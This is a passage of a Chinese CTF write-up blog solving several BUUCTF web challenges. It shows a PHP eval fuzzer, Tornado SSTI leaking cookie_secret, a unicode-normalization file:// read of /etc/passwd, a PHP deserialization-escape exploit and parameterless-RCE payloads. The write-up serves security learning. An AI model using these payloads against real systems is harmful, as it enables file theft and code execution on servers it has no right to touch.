class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> arrow <span class="hljs-keyword">import</span> now</span><br><span class="line"><span class="hljs-keyword">from</span> multiprocessing.pool <span class="hljs-keyword">import</span> ThreadPool</span><br><span class="line">url = <span class="hljs-string">"http://localhost/src/"</span></span><br><span class="line">work_dir = <span class="hljs-string">"C:\phpStudy\PHPTutorial\WWW\src\\"</span></span><br><span class="line">patternGet = re.compile(<span class="hljs-string">"(?<=_GET\[\').*(?=\'\])"</span>)</span><br><span class="line">patternPOST = re.compile(<span class="hljs-string">"(?<=_POST\[\').*(?=\'\])"</span>)</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">(i)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        content = open(work_dir + i, <span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8"</span>).read()</span><br><span class="line">        param1 = patternGet.findall(content)</span><br><span class="line">        paramGet = {}</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> list(set(param1)):</span><br><span class="line">            paramGet[j] = <span class="hljs-string">"echo(cjm00n);"</span></span><br><span class="line">        param2 = patternPOST.findall(content)</span><br><span class="line">        paramPOST = {}</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> list(set(param2)):</span><br><span class="line">            paramPOST[j] = <span class="hljs-string">"echo(cjm00n);"</span></span><br><span class="line">        <span class="hljs-comment"># print("[.] %s" % (i))</span></span><br><span class="line">        res = requests.post(url + i, params=paramGet, data=paramPOST).text</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">"cjm00n"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">            print(<span class="hljs-string">"[*] find at %s"</span> % (i))</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> param1:</span><br><span class="line">                res = requests.get(url + i, params={j:paramGet[j]}).text</span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-string">"cjm00n"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">                    print(<span class="hljs-string">"[*] find %s at %s"</span> %(j, i))</span><br><span class="line">                    print(<span class="hljs-string">"[*] time: %s"</span> %(now().format()))</span><br><span class="line">                    exit(<span class="hljs-number">0</span>)</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> param2:</span><br><span class="line">                res = requests.post(url + i, data={j:paramPOST[j]}).text</span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-string">"cjm00n"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">                    print(<span class="hljs-string">"[*] find %s at %s"</span> %(j, i))</span><br><span class="line">                    print(<span class="hljs-string">"[*] time: %s"</span> %(now().format()))</span><br><span class="line">                    exit(<span class="hljs-number">0</span>)</span><br><span class="line">                </span><br><span class="line">    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    filename = os.listdir(work_dir)</span><br><span class="line">    print(<span class="hljs-string">"[*] start fuzzing...."</span>)</span><br><span class="line">    print(now().format())</span><br><span class="line">    pool = ThreadPool(<span class="hljs-number">20</span>)</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> filename:</span><br><span class="line">        pool.apply_async(fuzz, (i, ))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225170356.png" alt></p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开后可以看到有3个文件, 整理一下文件的信息如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>同时可以观察到url</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8054a022-951c-4d19-bc64-c61811d345b4.node3.buuoj.cn/file?filename=/hints.txt&filehash=3a8e112bdc5efa665da8d5d7df15d1e8</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>根据文件名和url, 我们猜测是验证<code>filehash</code>后, 打开了对应的文件并将内容显示到网页中, 而<code>filehash</code>的计算公式中还需要一个<code>cookie_secret</code>, 随便改一下filename, 有个错误页面</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225175044.png" alt></p>
<p>python中经常出现404页面的SSTI, 这里的msg就是可以注入的参数, 一般来说, Flask的注入可以执行很多系统命令, 但是其他的模板如Django只能获取一些系统的变量等等, 在tornado中有个很方便的对象<code>handler</code>, 参考 <a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a>,  它指向了<code>RequestHandler</code>, 可以用来获取Web Application的setting, 例如我们需要的<code>cookie_secret</code>一般就是在Application的setting里面, 这里使用</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg={{handler.settings}}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225175908.png" alt></p>
<p>然后md5</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">    $filename = <span class="hljs-string">"/fllllllllllllag"</span>;</span><br><span class="line">    $cookie_secret = <span class="hljs-string">"a98fc479-624b-45a6-9b84-5c9b4caa2234"</span>;</span><br><span class="line">    <span class="hljs-keyword">echo</span> md5($cookie_secret.md5($filename));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>带上参数访问即可</p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>首先看到源码</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="hljs-string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="hljs-number">1</span>]</span><br><span class="line">    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="hljs-comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 333"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>需要绕过几个检测, 然后<code>urlopen()</code>打开, 由于要检测host, 所以不能直接打开文件, 这里有个知识点是如果用<code>file://</code>协议打开一个链接形式如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://hostname:port/path</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>file协议会默认从本地匹配路径, 因此上面的链接相当于</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///path</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>有了文件读取, 现在需要绕过这个检测, 这里参考<code>blackhat</code>的payload</p>
<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<p>绕过的payload如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.111.59.243:9000/getUrl?url=file://suctf.c%E2%84%85pt/../etc/passwd</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>解析后相当于</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.111.59.243:9000/getUrl?url=file://suctf.cc/opt/../etc/passwd</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225180316.png" alt></p>
<p>成功读取, 当时比赛的时候找了很久都没有找到flag</p>
<p>然后需要找到<code>nginx</code>的配置文件, 参考官方手册</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225180402.png" alt></p>
<p>也就是说默认的有如下几个路径</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/etc/nginx/ngin.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>分别读一下, 就能找到flag的位置</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225180627.png" alt></p>
<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>可以看到源码</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="hljs-string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($img)</span></span>{</span><br><span class="line">    $filter_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'php'</span>,<span class="hljs-string">'flag'</span>,<span class="hljs-string">'php5'</span>,<span class="hljs-string">'php4'</span>,<span class="hljs-string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="hljs-string">'/'</span>.implode(<span class="hljs-string">'|'</span>,$filter_arr).<span class="hljs-string">'/i'</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> preg_replace($filter,<span class="hljs-string">''</span>,$img);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>($_SESSION){</span><br><span class="line">    <span class="hljs-keyword">unset</span>($_SESSION);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="hljs-string">"user"</span>] = <span class="hljs-string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="hljs-string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(!$function){</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">'<a href="index.php?f=highlight_file">source_code</a>'</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(!$_GET[<span class="hljs-string">'img_path'</span>]){</span><br><span class="line">    $_SESSION[<span class="hljs-string">'img'</span>] = base64_encode(<span class="hljs-string">'guest_img.png'</span>);</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">    $_SESSION[<span class="hljs-string">'img'</span>] = sha1(base64_encode($_GET[<span class="hljs-string">'img_path'</span>]));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>($function == <span class="hljs-string">'highlight_file'</span>){</span><br><span class="line">    highlight_file(<span class="hljs-string">'index.php'</span>);</span><br><span class="line">}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'phpinfo'</span>){</span><br><span class="line">    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'phpinfo();'</span>); <span class="hljs-comment">//maybe you can find something in here!</span></span><br><span class="line">}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'show_image'</span>){</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="hljs-string">'img'</span>]));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>再看一眼phpinfo, 可以看到有个文件, 想办法读它</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225202541.png" alt></p>
<p>审计代码的关键点在于</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br><span class="line">...</span><br><span class="line">$userinfo = unserialize($serialize_info);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>一个是变量覆盖, 一个是反序列化<br>而代码最后是</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents(base64_decode($userinfo['img']));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>回溯一下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$userinfo <- unserialize($serialize_info) <- $serialize_info <- filter(serialize($_SESSION))</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>那我们要覆盖的就是<code>$_SESSION</code>, 这里有个filter, 他是在反序列化之后进行的, 而这就会出现反序列化字符串逃逸的漏洞<br>首先了解一下 <a href="https://xz.aliyun.com/t/6718" target="_blank" rel="noopener">https://xz.aliyun.com/t/6718</a><br>php对于反序列化的处理中, 不会对内容进行检查, 他只是单纯的根据声明的数字去找内容, 正常的反序列化字符串是这样的</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:{s:1:"b";s:1:"c";}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>如果我们把内容c改成这样</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:{s:1:"b";s:4:"c";}";}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>php也能够正常的反序列化, 因为c的部分声明了4的长度, 后面的4个字符都会包含在里面, 而如果出现某种情况导致4长度变成了1, 那反序列化就会结束而忽略掉最后的<code>;}</code>, 也就是说下面这样的字符串也可以正常的反序列化</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:{s:1:"b";s:1:"c";}";}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>而怎么造成这样的变化呢, 代码中有一个<code>filter</code>函数, 他会使得<code>_SESSION</code>数组的键值长度变短</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function filter($img){</span><br><span class="line">    $filter_arr = array('php','flag','php5','php4','fl1g');</span><br><span class="line">    $filter = '/'.implode('|',$filter_arr).'/i';</span><br><span class="line">    return preg_replace($filter,'',$img);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>如果我们让键值为<code>imgflagflag</code>, 就能吞掉后面8位的内容, 因为两个<code>flag</code>被替换成空了, 如果8个字符可以到达这个键对应的值的位置, 那我们就能够任意构造字符串了, 例如</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:{s:11:"imgflagflag";s:45:"";xxxxxxx;}";}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这里的串如果经过filter的话会变成</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:{s:11:"img";s:45:"";xxxxxxx;}";}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>也就是说<code>x</code>前面的内容都被包括进前一个字符串了, 后面的内容就自由构造, 只要符合语法就可以了</p>
<p>附上生成的exp</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"><span class="hljs-comment">// what file you want to read</span></span><br><span class="line">$filename = <span class="hljs-string">"/d0g3_fllllllag"</span>;</span><br><span class="line">$a[<span class="hljs-string">'img'</span>] = base64_encode($filename);</span><br><span class="line">$res = substr(serialize($a), <span class="hljs-number">5</span>);</span><br><span class="line">$_SESSION[<span class="hljs-string">'imgflagflag'</span>] = <span class="hljs-string">'";s:1:"a";'</span>.$res;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"_SESSION['imgflagflag']="</span>.$_SESSION[<span class="hljs-string">'imgflagflag'</span>];</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191225215832.png" alt></p>
<h2 id="ByteCTF-2019-Boring-Code"><a href="#ByteCTF-2019-Boring-Code" class="headerlink" title="[ByteCTF 2019]Boring Code"></a>[ByteCTF 2019]Boring Code</h2><p>题目代码很简洁, 先是在index.php里面有一句</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag in this file and code in /code</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>访问code, 可以看到代码</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid_url</span><span class="hljs-params">($url)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/data:\/\//i'</span>, $url)) {</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'url'</span>])){</span><br><span class="line">    $url = $_POST[<span class="hljs-string">'url'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (is_valid_url($url)) {</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/baidu\.com$/'</span>, $r[<span class="hljs-string">'host'</span>])) {</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="hljs-keyword">if</span> (<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $code)) {</span><br><span class="line">                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) {</span><br><span class="line">                    <span class="hljs-keyword">echo</span> <span class="hljs-string">'bye~'</span>;</span><br><span class="line">                } <span class="hljs-keyword">else</span> {</span><br><span class="line">                    <span class="hljs-keyword">eval</span>($code);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">echo</span> <span class="hljs-string">"error: host not allowed"</span>;</span><br><span class="line">        }</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"error: invalid url"</span>;</span><br><span class="line">    }</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>由于实在是绕不过去baidu.com的检测, 去买了个<code>kapbaidu.com</code>的域名, 花了55块钱, 很心痛</p>
<p>有了域名就很快乐, 可以直接读命令了, 然后要绕过正则, 是一个无参数RCE的正则, 可以参考两道之前的题目</p>
<ul>
<li>codebreaking的phplimit</li>
<li>rctf2018的r-cursive</li>
</ul>
<p>读文件的payload大概如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>但是题目把里面的大部分都过滤了, 先fuzz了一下可用函数</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">$list = get_defined_functions()[<span class="hljs-string">'internal'</span>];</span><br><span class="line"><span class="hljs-keyword">foreach</span>($list <span class="hljs-keyword">as</span> $key => $code){</span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) {</span><br><span class="line">        <span class="hljs-keyword">unset</span>($list[$key]);</span><br><span class="line">    } </span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/[^(a-z)]/i'</span>, $code)){</span><br><span class="line">        <span class="hljs-keyword">unset</span>($list[$key]);</span><br><span class="line">    };</span><br><span class="line">}</span><br><span class="line">var_dump($list);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>研究了很久之后决定用chr() + 时间函数的组合</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(microtime(chdir(next(scandir(chr(next(each(localtime())))))))))));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>简单来说就是上面的变型, 其中</p>
<ul>
<li>end 代替 next(array_reverse())</li>
<li>chr(microtime()) 和chr(next(scandir(chr(next(each(localtime())))))) 都是代替 .</li>
<li>next(scandir() 代替 ..</li>
</ul>
<p>但是这个太随缘, 爆了很久都没用, 最后队友@kk发了个替换<code>.</code>的方法</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next(each(localeconv()))</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>最终payload如下</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(microtime(chdir(next(scandir(next(each(localeconv()))))))))));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>传到服务器上爆破即可</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191228104207.png" alt></p>
<p>不过在buu上做就心酸的多了, 赵总给了个内网的靶机, 但是<code>xshell</code>挂上代理连不上</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191228104435.png" alt></p>
<p>用<code>proxychains</code>也没连上</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191228104456.png" alt></p>
<p>在这个师傅的博客上找到了绕过的方法 <a href="http://github.mrkaixin.computer/2019/06/05/BUUCTF%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/#toc-heading-26" target="_blank" rel="noopener">Buuoj Writeups(一)</a></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=compress.zlib://data:@baidu.com/baidu.com?,payload;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后就是随缘爆破了,  这里也说一下buu的访问频率在每秒50个请求以内, 超过就会ban ip</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191228104859.png" alt></p>
